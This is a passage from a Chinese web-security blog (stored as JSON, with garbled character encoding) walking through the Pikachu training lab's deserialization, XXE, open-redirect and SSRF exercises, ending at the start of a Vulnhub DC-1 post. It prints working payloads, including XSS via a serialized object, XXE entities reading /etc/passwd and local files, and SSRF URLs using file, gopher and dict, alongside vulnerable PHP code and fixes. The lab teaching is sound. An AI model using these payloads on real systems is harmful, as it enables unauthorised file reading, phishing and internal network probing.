__wakeupå°†åœ¨åºåˆ—åŒ–ä¹‹åç«‹å³è¢«è°ƒç”¨\n\n        æ¼æ´ä¸¾ä¾‹:å®šä¹‰ä¸€ä¸ªç±»ï¼Œå†™ä¸€ä¸ªfunctionï¼Œè¿™ä¸ªfunctionç›´æ¥ä½¿ç”¨äº†é­”æ³•æ–¹æ³•\n        class S{\n            var $test = \"pikachu\";\n            function __destruct(){\n                echo $this->test;\n            }\n        }\n        $s = $_GET['test'];\n        @$unser = unserialize($a);\n\n        payload:O:1:\"S\":1:{s:4:\"test\";s:29:\"<script>alert('xss')</script>\";}\n```\n\n**æºç åˆ†æ**\n\n```php\nclass S{\n    var $test = \"pikachu\";\n    function __construct(){\n        echo $this->test;\n    }\n}\n\n\n//O:1:\"S\":1:{s:4:\"test\";s:29:\"<script>alert('xss')</script>\";}\n$html='';\nif(isset($_POST['o'])){\n    $s = $_POST['o'];\n    if(!@$unser = unserialize($s)){\n        $html.=\"<p>å¤§å…„å¼Ÿ,æ¥ç‚¹åŠ²çˆ†ç‚¹å„¿çš„!</p>\";\n    }else{\n        $html.=\"<p>{$unser->test}</p>\";\n    }\n\n}\n```\n\n**æ²¡æœ‰å¯¹ç”¨æˆ·ä¼ è¿›æ¥çš„å‚æ•°åšè¿‡æ»¤ï¼Œç›´æ¥ååºåˆ—åŒ–ã€‚**\n\n**åˆ©ç”¨ç›¸ä¼¼çš„ä»£ç ç”Ÿæˆä¸€ä¸ªååºåˆ—åŒ–çš„å­—ç¬¦ä¸²**\n\n```php\n<?php\nclass S{\n    var $test = \"<script>alert('xss')</script>\";\n}\n$a = new S();\necho serialize($a);\n?>\n```\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200715113815.png)**\n\n**æäº¤payload:`O:1:\"S\":1:{s:4:\"test\";s:29:\"<script>alert('xss')</script>\";}`**\n\n**ååºåˆ—åŒ–çš„ç»“æœæ˜¯ä¸€ä¸ª JS çš„å¼¹çª—ï¼Œæˆ‘ä»¬æäº¤åå°±èƒ½è¿›è¡Œ XSS æ”»å‡»**\n\n## **XXE**\n\n### **åŸºç¡€çŸ¥è¯†å‡†å¤‡**\n\n> **XXE -\"xml external entity injection\" å³\"xmlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´\"ã€‚**\n> **æ¦‚æ‹¬ä¸€ä¸‹å°±æ˜¯\"æ”»å‡»è€…é€šè¿‡å‘æœåŠ¡å™¨æ³¨å…¥æŒ‡å®šçš„xmlå®ä½“å†…å®¹,ä»è€Œè®©æœåŠ¡å™¨æŒ‰ç…§æŒ‡å®šçš„é…ç½®è¿›è¡Œæ‰§è¡Œ,å¯¼è‡´é—®é¢˜\"**\n> **ä¹Ÿå°±æ˜¯è¯´æœåŠ¡ç«¯æ¥æ”¶å’Œè§£æäº†æ¥è‡ªç”¨æˆ·ç«¯çš„xmlæ•°æ®,è€Œåˆæ²¡æœ‰åšä¸¥æ ¼çš„å®‰å…¨æ§åˆ¶,ä»è€Œå¯¼è‡´xmlå¤–éƒ¨å®ä½“æ³¨å…¥ã€‚**\n> **ç°åœ¨å¾ˆå¤šè¯­è¨€é‡Œé¢å¯¹åº”çš„è§£æxmlçš„å‡½æ•°é»˜è®¤æ˜¯ç¦æ­¢è§£æå¤–éƒ¨å®ä½“å†…å®¹çš„,ä»è€Œä¹Ÿå°±ç›´æ¥é¿å…äº†è¿™ä¸ªæ¼æ´ã€‚**\n> **ä»¥PHPä¸ºä¾‹,åœ¨PHPé‡Œé¢è§£æxmlç”¨çš„æ˜¯libxml,å…¶åœ¨â‰¥2.9.0çš„ç‰ˆæœ¬ä¸­,é»˜è®¤æ˜¯ç¦æ­¢è§£æxmlå¤–éƒ¨å®ä½“å†…å®¹çš„ã€‚**\n>\n> **æœ¬ç« æä¾›çš„æ¡ˆä¾‹ä¸­,ä¸ºäº†æ¨¡æ‹Ÿæ¼æ´,é€šè¿‡æ‰‹åŠ¨æŒ‡å®šLIBXML_NOENTé€‰é¡¹å¼€å¯äº†xmlå¤–éƒ¨å®ä½“è§£æã€‚**\n\n**XMLæ˜¯å¯æ‰©å±•çš„æ ‡è®°è¯­è¨€ï¼ˆE`X`tensible `M`arkup `L`anguageï¼‰ï¼Œè®¾è®¡ç”¨æ¥è¿›è¡Œæ•°æ®çš„ä¼ è¾“å’Œå­˜å‚¨ï¼Œ ç»“æ„æ˜¯æ ‘å½¢ç»“æ„ï¼Œç”±æ ‡ç­¾æ„æˆï¼Œè¿™ç‚¹å¾ˆåƒHTMLè¯­è¨€ã€‚ä½†æ˜¯XMLå’ŒHTMLæœ‰æ˜æ˜¾åŒºåˆ«å¦‚ä¸‹ï¼š**\n\n```\nXML è¢«è®¾è®¡ç”¨æ¥ä¼ è¾“å’Œå­˜å‚¨æ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å†…å®¹ã€‚\nHTML è¢«è®¾è®¡ç”¨æ¥æ˜¾ç¤ºæ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å¤–è§‚ã€‚\n```\n\n**XMLè¯­æ³•ç»“æ„å¤§è‡´å¦‚ä¸‹**\n\n```xml\nç¬¬ä¸€éƒ¨åˆ†ï¼šXMLå£°æ˜éƒ¨åˆ†\n<?xml version=\"1.0\"?>\n\nç¬¬äºŒéƒ¨åˆ†ï¼šæ–‡æ¡£ç±»å‹å®šä¹‰ DTD\n<!DOCTYPE note[ \n<!--å®šä¹‰æ­¤æ–‡æ¡£æ˜¯noteç±»å‹çš„æ–‡æ¡£-->\n<!ENTITY entity-name SYSTEM \"URI/URL\">\n<!--å¤–éƒ¨å®ä½“å£°æ˜-->\n]>\n\nç¬¬ä¸‰éƒ¨åˆ†ï¼šæ–‡æ¡£å…ƒç´ \n<note>\n<to>Dave</to>\n<from>Tom</from>\n<head>Reminder</head>\n<body>You are a good man</body>\n</note>\n```\n\n**DTDï¼ˆDocument Type Definitionï¼Œæ–‡æ¡£ç±»å‹å®šä¹‰ï¼‰ï¼Œç”¨æ¥ä¸º XML æ–‡æ¡£å®šä¹‰è¯­æ³•çº¦æŸï¼Œå¯ä»¥æ˜¯å†…éƒ¨ç”³æ˜ä¹Ÿå¯ä»¥ä½¿å¼•ç”¨å¤–éƒ¨DTDï¼Œç°åœ¨å¾ˆå¤šè¯­è¨€é‡Œé¢å¯¹åº”çš„è§£æxmlçš„å‡½æ•°é»˜è®¤æ˜¯ç¦æ­¢è§£æå¤–éƒ¨å®ä½“å†…å®¹çš„ï¼Œä»è€Œä¹Ÿå°±ç›´æ¥é¿å…äº†è¿™ä¸ªæ¼æ´ã€‚**\n\n```xml\nâ‘  å†…éƒ¨ç”³æ˜DTDæ ¼å¼\n<!DOCTYPE æ ¹å…ƒç´  [å…ƒç´ ç”³æ˜]>\n\nâ‘¡ å¤–éƒ¨å¼•ç”¨DTDæ ¼å¼\n<!DOCTYPE æ ¹å…ƒç´  SYSTEM \"å¤–éƒ¨DTDçš„URI\">\n\nâ‘¢ å¼•ç”¨å…¬å…±DTDæ ¼å¼\n<!DOCTYPE æ ¹å…ƒç´  PUBLIC \"DTDæ ‡è¯†å\" \"å…¬å…±DTDçš„URI\">\n```\n\n### **Pikachu**\n\n**å†…éƒ¨å®ä½“å¼•ç”¨ Payload**\n\n```xml\n<?xml version = \"1.0\"?>\n<!DOCTYPE note [\n    <!ENTITY hacker \"hihihi\">\n]>\n<name>&hacker;</name>\n```\n\n**å¦‚æœç”¨æ„é€ çš„`payload`å§‹ç»ˆæ— æ³•æˆåŠŸï¼Œä¿®æ”¹ä¸€å“ˆPhpStudyçš„phpç‰ˆæœ¬å³å¯**\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200715113809.png)**\n\n**å¤–éƒ¨å®ä½“å¼•ç”¨ Payload**\n\n**![å¤–éƒ¨å¼•ç”¨æ”¯æŒçš„åè®®](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200715114611.png)**\n\n**åœ¨Dç›˜ä¸‹æ–°å»ºä¸€ä¸ªjwt.txt,å†…å®¹ä¸ºhahaha,ä½œä¸ºæˆ‘ä»¬è¦è¯»å–çš„æ–‡ä»¶**\n\n**ä½¿ç”¨fileåè®®è¯»å–**\n\n```xml\n<?xml version=\"1.0\"  encoding=\"UTF-8\"?>\n<!DOCTYPE name [\n<!ENTITY f SYSTEM \"file:///D://jwt.txt\">]>\n<name>&f;</name>\n```\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200715115834.png)**\n\n**ä½¿ç”¨phpåè®®è¯»å–**\n\n```xml\n<?xml version = \"1.0\"?>\n<!DOCTYPE ANY [\n    <!ENTITY f SYSTEM \"php://filter/read=convert.base64-encode/resource=D://jwt.txt\">\n]>\n<x>&f;</x>\n```\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200715120128.png)**\n\n**Linuxä¸‹è¯»å–**\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE ANY[ \n<!ENTITY f SYSTEM \"file:///etc/passwd\">\n]>\n<x>&f;</x>\n```\n\n**æºç åˆ†æ**\n\n```php\n$html='';\nif(isset($_POST['submit']) and $_POST['xml'] != null){\n    $xml =$_POST['xml'];\n    $data = @simplexml_load_string($xml,'SimpleXMLElement',LIBXML_NOENT);//æ·»åŠ äº†LIBXML_NOENTå‚æ•°å¼€å¯äº†å¤–éƒ¨å®ä½“è§£æ\n    if($data){\n        $html.=\"<pre>{$data}</pre>\";\n    }else{\n        $html.=\"<p>XMLå£°æ˜ã€DTDæ–‡æ¡£ç±»å‹å®šä¹‰ã€æ–‡æ¡£å…ƒç´ è¿™äº›éƒ½ææ‡‚äº†å—?</p>\";\n    }\n}\n```\n\n**å¦‚æœä¸€ä¸ªæ¥å£æ”¯æŒæ¥æ”¶XMLæ•°æ®ï¼Œä¸”æ²¡æœ‰å¯¹XMLæ•°æ®åšä»»ä½•å®‰å…¨ä¸Šçš„æªæ–½ï¼Œå°±å¯èƒ½å¯¼è‡´XXEæ¼æ´ã€‚**\n\n**simplexml_load_string()å‡½æ•°è½¬æ¢å½¢å¼è‰¯å¥½çš„XMLå­—ç¬¦ä¸²ä¸ºSimpleXMLElementå¯¹è±¡ã€‚**\n\n### **XXEæ¼æ´é˜²èŒƒ**\n\n**æ–¹æ¡ˆï¼šä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•**\n**1.PHPï¼š**\n\n```php\nlibxml_disable_entity_loader(true);\n```\n\n**2.JAVAï¼š**\n\n```java\nDocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();\ndbf.setExpandEntityReferences(false);\n```\n\n**3.Pythonï¼š**\n\n```python\nfrom lxml import etree\nxmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))\n```\n\n### **CTFå®ä¾‹**\n\n#### **é¢˜ç›® Jarvis OJ--apiè°ƒç”¨**\n\n**é¢˜ç›®åœ°å€ï¼šhttp://web.jarvisoj.com:9882/**\n\n**è§£é¢˜æ€è·¯:**\n\n**XXEæ¼æ´å°±æ˜¯æœåŠ¡å™¨æ¥å—ä»å®¢æˆ·ç«¯å‘é€æ¥çš„xmlæ ¼å¼æ•°æ®æ—¶ï¼Œxmlæ•°æ®ä¸­æ¶æ„çš„å¼•ç”¨äº†å¤–éƒ¨å®ä½“ï¼Œå°†å®ƒçš„å€¼ç»‘å®šä¸ºæœåŠ¡å™¨çš„ç›®æ ‡æ–‡ä»¶ï¼Œè¿™æ ·åœ¨æœåŠ¡å™¨è¿”å›ç»™æˆ‘ä»¬è§£æåçš„å€¼æ—¶ï¼Œå°±ä¼šæŠŠç›®æ ‡æ–‡ä»¶çš„å†…å®¹è¿”å›ç»™æˆ‘ä»¬ï¼Œæˆ‘ä»¬å°±è¯»å–äº†æ•æ„Ÿæ–‡ä»¶ã€‚**\n\n**è¿™é“é¢˜ç›®ï¼Œé»˜è®¤çš„æ˜¯jsonæ ¼å¼ä¼ é€’ï¼Œå› æ­¤é¦–å…ˆæˆ‘ä»¬æ›´æ”¹`Content-Type`çš„å€¼ä¸º`application/xml`,ç„¶åä¼ å…¥xmlä»£ç ï¼š**\n\n**Payload**\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE ANY[ \n<!ENTITY f SYSTEM \"file:///home/ctf/flag.txt\">\n]>\n<x>&f;</x>\n```\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200715165006.png)**\n\n## **URLé‡å®šå‘**\n\n>**ä¸å®‰å…¨çš„URLè·³è½¬é—®é¢˜å¯èƒ½å‘ç”Ÿåœ¨ä¸€åˆ‡æ‰§è¡Œäº†URLåœ°å€è·³è½¬çš„åœ°æ–¹ã€‚**\n>**å¦‚æœåç«¯é‡‡ç”¨äº†å‰ç«¯ä¼ è¿›æ¥çš„å‚æ•°(å¯èƒ½æ˜¯ç”¨æˆ·ä¼ å‚,æˆ–è€…ä¹‹å‰é¢„åŸ‹åœ¨å‰ç«¯é¡µé¢çš„URLåœ°å€)ä½œä¸ºäº†è·³è½¬çš„ç›®çš„åœ°,è€Œåˆæ²¡æœ‰åšåˆ¤æ–­çš„è¯å°±å¯èƒ½å‘ç”Ÿ\"è·³é”™å¯¹è±¡\"çš„é—®é¢˜ã€‚**\n>\n>**URLè·³è½¬æ¯”è¾ƒç›´æ¥çš„å±å®³æ˜¯:-->é’“é±¼,æ—¢æ”»å‡»è€…ä½¿ç”¨æ¼æ´æ–¹çš„åŸŸå(æ¯”å¦‚ä¸€ä¸ªæ¯”è¾ƒå‡ºåçš„å…¬å¸åŸŸåå¾€å¾€ä¼šè®©ç”¨æˆ·æ”¾å¿ƒçš„ç‚¹å‡»)åšæ©ç›–,è€Œæœ€ç»ˆè·³è½¬çš„ç¡®å®é’“é±¼ç½‘ç«™**\n\n**1.è¿›å…¥é¡µé¢æ˜¯å››ä¸ªè¶…é“¾æ¥ï¼Œä¾æ¬¡ç‚¹ä¸€éï¼Œç‚¹åˆ°æœ€åä¸€å¥æ—¶ï¼Œå‘ç°URLå¸¦æœ‰å‚æ•°**\n\n```url\nhttp://127.0.0.1/pikachu-master/vul/urlredirect/urlredirect.php?url=i\n```\n\n**2.æˆ‘ä»¬å¯ä»¥ç›´æ¥æŠŠå‚æ•°`i`,æ”¹ä¸ºé’“é±¼ç½‘ç«™çš„ç½‘å€ï¼Œè¿™é‡Œæˆ‘å°±å‡è®¾æˆ‘çš„åšå®¢æ˜¯é’“é±¼ç½‘ç«™**\n\n```url\nhttp://127.0.0.1/pikachu-master/vul/urlredirect/urlredirect.php?url=https://jwt1399.top\n```\n\n**3.æŠŠä¸Šé¢è¿™ä¸ªURLå‘é€ç»™ç”¨æˆ·ï¼Œç”¨æˆ·ç‚¹å‡»å°±ä¼šè·³è½¬åˆ°é’“é±¼ç½‘ç«™**\n\n**æºç åˆ†æ**\n\n```php\n$html=\"\";\nif(isset($_GET['url']) && $_GET['url'] != null){\n    $url = $_GET['url'];\n    if($url == 'i'){\n        $html.=\"<p>å¥½çš„,å¸Œæœ›ä½ èƒ½åšæŒåšä½ è‡ªå·±!</p>\";\n    }else {\n        header(\"location:{$url}\");\n    }\n}\n```\n\n**é€šè¿‡GETè¯·æ±‚è·å–å‰ç«¯ä¼ è¿›æ¥çš„urlï¼Œåˆ¤æ–­æ˜¯å¦ç­‰äºiï¼Œå¦‚æœä¸ç­‰ï¼Œå°±è·³è½¬åˆ°urlå¯¹åº”çš„åœ°å€å»ã€‚è¿™å°±å­˜åœ¨URLé‡å®šå‘é—®é¢˜ã€‚**\n\n **ä¿®å¤**\n\n**å¯¹urlè¿›è¡Œç™½åå•çš„é™åˆ¶ï¼Œå¦‚æœä¸åœ¨ç™½åå•ï¼Œå°±è·³è½¬åˆ°å›ºå®šçš„é¡µé¢**\n\n## **SSRF**\n\n> **SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ )ï¼Œå…¶å½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½,ä½†åˆæ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšä¸¥æ ¼è¿‡æ»¤ä¸é™åˆ¶**\n>\n> **å¯¼è‡´æ”»å‡»è€…å¯ä»¥ä¼ å…¥ä»»æ„çš„åœ°å€æ¥è®©åç«¯æœåŠ¡å™¨å¯¹å…¶å‘èµ·è¯·æ±‚,å¹¶è¿”å›å¯¹è¯¥ç›®æ ‡åœ°å€è¯·æ±‚çš„æ•°æ®**\n>\n> **æ•°æ®æµ:æ”»å‡»è€…----->æœåŠ¡å™¨---->ç›®æ ‡åœ°å€**\n>\n> **ç®€å•ç†è§£ï¼šæœåŠ¡å™¨æ¥å—äº†å®¢æˆ·ç«¯è¾“å…¥çš„URLï¼Œç„¶åæœåŠ¡å™¨ç«¯æ‹¿URLå»è¯·æ±‚å¹¶è¿”å›ç»™ä½ ã€‚**\n\n**æ ¹æ®åå°ä½¿ç”¨çš„å‡½æ•°çš„ä¸åŒ,å¯¹åº”çš„å½±å“å’Œåˆ©ç”¨æ–¹æ³•åˆæœ‰ä¸ä¸€æ ·**\n```\nPHPä¸­ä¸‹é¢å‡½æ•°çš„ä½¿ç”¨ä¸å½“ä¼šå¯¼è‡´SSRF:\nfile_get_contents()\nfsockopen()\ncurl_exec()    \n```\n\n**å¦‚æœä¸€å®šè¦é€šè¿‡åå°æœåŠ¡å™¨è¿œç¨‹å»å¯¹ç”¨æˆ·æŒ‡å®š(\"æˆ–è€…é¢„åŸ‹åœ¨å‰ç«¯çš„è¯·æ±‚\")çš„åœ°å€è¿›è¡Œèµ„æºè¯·æ±‚,åˆ™è¯·åšå¥½ç›®æ ‡åœ°å€çš„è¿‡æ»¤ã€‚**\n\n### **curl**\n\n**PHPæ”¯æŒçš„ç”±Daniel Stenbergåˆ›å»ºçš„libcurlåº“å…è®¸ä½ ä¸å„ç§çš„æœåŠ¡å™¨ä½¿ç”¨å„ç§ç±»å‹çš„åè®®è¿›è¡Œè¿æ¥å’Œé€šè®¯ã€‚**\n\n**libcurlç›®å‰æ”¯æŒhttpã€httpsã€ftpã€gopherã€telnetã€dictã€fileå’Œldapåè®®ã€‚libcurlåŒæ—¶ä¹Ÿæ”¯æŒHTTPSè®¤è¯ã€HTTP POSTã€HTTP PUTã€ FTP ä¸Šä¼ (è¿™ä¸ªä¹Ÿèƒ½é€šè¿‡PHPçš„FTPæ‰©å±•å®Œæˆ)ã€HTTP åŸºäºè¡¨å•çš„ä¸Šä¼ ã€ä»£ç†ã€cookieså’Œç”¨æˆ·å+å¯†ç çš„è®¤è¯ã€‚**\n\n**curlå‡½æ•°å‚è€ƒï¼šhttps://www.runoob.com/php/php-ref-curl.html**\n\n```\n//fileåè®®è¯»å–\n?url=file:///D://jwt.txt\n\n//gopheråè®®\n//åŸºæœ¬åè®®æ ¼å¼ï¼šURL:gopher://<host>:<port>/<gopher-path>_åæ¥TCPæ•°æ®æµ\n?url=gopher://119.23.243.154:22\n\n//dictåè®®\n?url=dict://119.23.243.154:22\n\n//http/httpsåè®®\n?url=http://x.x.x.x/\n?url=https://x.x.x.x/\n\n//æ¢æµ‹å†…ç½‘å…¶ä»–ä¸»æœºçš„ç«¯å£\n?url=http://x.x.x.x:port\n```\n\n| **fileåè®®**                                                 | **http/httpsåè®®**                                           | **ç«¯å£**                                                     |\n| ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| **![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200715182340.png)** | **![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200715182343.png)** | **![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200715182346.png)** |\n\n**æºç åˆ†æ**\n\n```php\nif(isset($_GET['url']) && $_GET['url'] != null){\n    //æ¥æ”¶å‰ç«¯URLæ²¡é—®é¢˜,ä½†æ˜¯è¦åšå¥½è¿‡æ»¤,å¦‚æœä¸åšè¿‡æ»¤,å°±ä¼šå¯¼è‡´SSRF\n    $URL = $_GET['url'];\n    $CH = curl_init($URL);\n    curl_setopt($CH, CURLOPT_HEADER, FALSE);\n    curl_setopt($CH, CURLOPT_SSL_VERIFYPEER, FALSE);\n    $RES = curl_exec($CH);\n    curl_close($CH) ;\n    echo $RES;\n}\n```\n\n**å‰ç«¯ä¼ è¿›æ¥çš„urlè¢«åå°ä½¿ç”¨curl_exec()è¿›è¡Œäº†è¯·æ±‚,ç„¶åå°†è¯·æ±‚çš„ç»“æœåˆè¿”å›ç»™äº†å‰ç«¯ï¼Œå¹¶ä¸”æ²¡åšä»»ä½•è¿‡æ»¤æˆ–é™åˆ¶ã€‚ä»è€Œå¯¼è‡´äº†ç”¨æˆ·å¯èƒ½å¯ä»¥é€šè¿‡è¿™ä¸ªæ¼æ´è¿›è¡Œä¸€äº›å†…ç½‘æœåŠ¡æ¢æµ‹ç­‰ç­‰**\n\n**å‚è€ƒï¼š[SSRFåŸç†å®æˆ˜åŠä¿®å¤æ–¹å¼](https://segmentfault.com/a/1190000021810264)**\n\n### **file_get_content**\n\n**file_get_contents() æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚è¯¥å‡½æ•°æ˜¯ç”¨äºæŠŠæ–‡ä»¶çš„å†…å®¹è¯»å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­çš„é¦–é€‰æ–¹æ³•ã€‚å¦‚æœæœåŠ¡å™¨æ“ä½œç³»ç»Ÿæ”¯æŒï¼Œè¿˜ä¼šä½¿ç”¨å†…å­˜æ˜ å°„æŠ€æœ¯æ¥å¢å¼ºæ€§èƒ½ã€‚**\n\n**å‡½æ•°è¯­æ³•:  file_get_contents(path,include_path,context,start,max_length)**\n\n| **å‚æ•°**         | **æè¿°**                                                     |\n| ---------------- | ------------------------------------------------------------ |\n| **path**         | **å¿…éœ€ã€‚è§„å®šè¦è¯»å–çš„æ–‡ä»¶ã€‚**                                 |\n| **include_path** | **å¯é€‰ã€‚å¦‚æœæ‚¨è¿˜æƒ³åœ¨ include_pathï¼ˆåœ¨ php.ini ä¸­ï¼‰ä¸­æœç´¢æ–‡ä»¶çš„è¯ï¼Œè¯·è®¾ç½®è¯¥å‚æ•°ä¸º '1'ã€‚** |\n| **context**      | **å¯é€‰ã€‚è§„å®šæ–‡ä»¶å¥æŸ„çš„ç¯å¢ƒã€‚context æ˜¯ä¸€å¥—å¯ä»¥ä¿®æ”¹æµçš„è¡Œä¸ºçš„é€‰é¡¹ã€‚è‹¥ä½¿ç”¨ NULLï¼Œåˆ™å¿½ç•¥ã€‚** |\n| **start**        | **å¯é€‰ã€‚è§„å®šåœ¨æ–‡ä»¶ä¸­å¼€å§‹è¯»å–çš„ä½ç½®ã€‚è¯¥å‚æ•°æ˜¯ PHP 5.1 ä¸­æ–°å¢çš„ã€‚** |\n| **max_length**   | **å¯é€‰ã€‚è§„å®šè¯»å–çš„å­—èŠ‚æ•°ã€‚è¯¥å‚æ•°æ˜¯ PHP 5.1 ä¸­æ–°å¢çš„ã€‚**      |\n\n```\n//fileåè®®è¯»å–\n?file=file:///D://jwt.txt\n\n//è¯»å–phpæºç \n?file=php://filter/read=convert.base64-encode/resource=ssrf.php\n\n//å†…ç½‘å…¶å®ƒä¸»æœºè¯·æ±‚\n?file=http://x.x.x.x/xx.index\n\n//æ¢æµ‹å†…ç½‘å…¶ä»–ä¸»æœºçš„ç«¯å£\n?file=http://x.x.x.x:port\n\t\n```\n\n**æºç åˆ†æ**\n\n```php\nif(isset($_GET['file']) && $_GET['file'] !=null){\n    $filename = $_GET['file'];\n    $str = file_get_contents($filename);\n    echo $str;\n}\n```\n\n**ç›´æ¥è®¿é—®è·å–åˆ°çš„æ–‡ä»¶**\n\n### **SSRFé˜²èŒƒ**\n\n**1.å¯ä»¥é‡‡å–ç™½åå•,é™åˆ¶å†…ç½‘Ipã€‚**\n**2.å¯¹è¿”å›å†…å®¹è¿›è¡Œè¯†åˆ«**\n**3.ç¦ç”¨ä¸€äº›ä¸å¿…è¦çš„åè®®**\n**4.ç»Ÿä¸€é”™è¯¯ä¿¡æ¯ï¼Œé¿å…ç”¨æˆ·å¯ä»¥æ ¹æ®é”™è¯¯ä¿¡æ¯æ¥åˆ¤æ–­è¿œç«¯æœåŠ¡å™¨çš„ç«¯å£çŠ¶æ€**\n\n**å‚è€ƒï¼š[CTF Wiki-SSRF](https://wiki.x10sec.org/web/ssrf/)ã€[SSRF å­¦ä¹ è®°å½•](https://hackmd.io/@Lhaihai/H1B8PJ9hX?type=view#SSRF-å­¦ä¹ è®°å½•)ã€[SSRFæ¼æ´åˆ†æä¸åˆ©ç”¨](http://www.91ri.org/17111.html)**\n\n### **CTFå®ä¾‹**\n\n**é¢˜ç›®ï¼šhackme--XSSRF**\n\n**é¢˜ç›®åœ°å€ï¼šhttps://xssrf.hackme.inndy.tw/**\n\n**è§£é¢˜æ€è·¯ï¼š**\n\n**è¿™ä¸ªé¢˜ä¸€å…±æœ‰ä¸‰å…³ï¼Œxss->ssrf->redis**\n\n**å‚è€ƒï¼š**\n\n**[XSSçš„å¨åŠ›ï¼šä»XSSåˆ°SSRFå†åˆ°Redis](https://www.anquanke.com/post/id/156377)**\n\n**[xss->ssrf->redis](https://skysec.top/2018/08/17/xss-ssrf-redis/)**\n\n**[XSSmeé¢˜ç›®å¤ç°](http://www.northity.com/2018/10/23/XSSmeé¢˜ç›®å¤ç°/)**\n\n\n\n## **èµåŠ©ğŸ’°**\n\n**å¦‚æœä½ è§‰å¾—å¯¹ä½ æœ‰å¸®åŠ©ï¼Œä½ å¯ä»¥èµåŠ©æˆ‘ä¸€æ¯å†°å¯ä¹ï¼å˜»å˜»ğŸ¤­**\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>","tags":["é¶åœº","WebåŸºç¡€æ¼æ´"],"categories":["Web"]},{"title":"Vulnhubé¶æœºï¼šDC-1","url":"/posts/8808.html","content":"## Vulnhub\n\n### ç®€ä»‹\n\nVulnhubæ˜¯ä¸€ä¸ªæä¾›å„ç§æ¼æ´ç¯å¢ƒçš„é¶åœºå¹³å°ï¼Œå¤§éƒ¨åˆ†ç¯å¢ƒæ˜¯åšå¥½çš„è™šæ‹Ÿæœºé•œåƒæ–‡ä»¶ï¼Œé•œåƒé¢„å…ˆè®¾è®¡äº†å¤šç§æ¼æ´ï¼Œéœ€è¦ä½¿ç”¨VMwareæˆ–è€…VirtualBoxè¿è¡Œã€‚æ¯ä¸ªé•œåƒä¼šæœ‰ç ´è§£çš„ç›®æ ‡ï¼ŒæŒ‘æˆ˜çš„ç›®æ ‡æ˜¯è·å–æ“ä½œç³»ç»Ÿçš„rootæƒé™å’ŒæŸ¥çœ‹flagã€‚\n\n### éƒ¨ç½²æ–¹æ³•\n\nå®˜ç½‘ï¼šhttps://www.vulnhub.com\n\n1.åœ¨å®˜ç½‘æœç´¢ä½ æƒ³è¦çš„é•œåƒ,ç„¶åä¸‹è½½ã€å»ºè®®ä¸‹è½½ (Mirror)ç‰ˆæœ¬ã€‘\n\n2.ä¸‹è½½å¥½åè§£å‹å¾—åˆ°`.ova`çš„æ–‡ä»¶ï¼Œå³å‡»é€‰æ‹©VMwareè¿›è¡Œæ‰“å¼€\n\n3.åœ¨å¼¹å‡ºçš„æ¡†ä¸­ï¼Œé€‰æ‹©å­˜æ”¾çš„ä½ç½®ï¼Œç„¶åç‚¹å‡»å¯¼å…¥\n\n4.æœ€åç­‰å¾…å¯¼å…¥å®Œæˆï¼Œç„¶åå¯åŠ¨è¯¥è™šæ‹Ÿæœºå°±å¯ä»¥äº†\n\n## DC-1__drupal\n\n### é›¶ã€ç®€ä»‹\n\n**é¶æœºä¸‹è½½åœ°å€ï¼š**https://download.vulnhub.com/dc/DC-1.zip\n\n**é¶æœºæè¿°ï¼š**DC-1 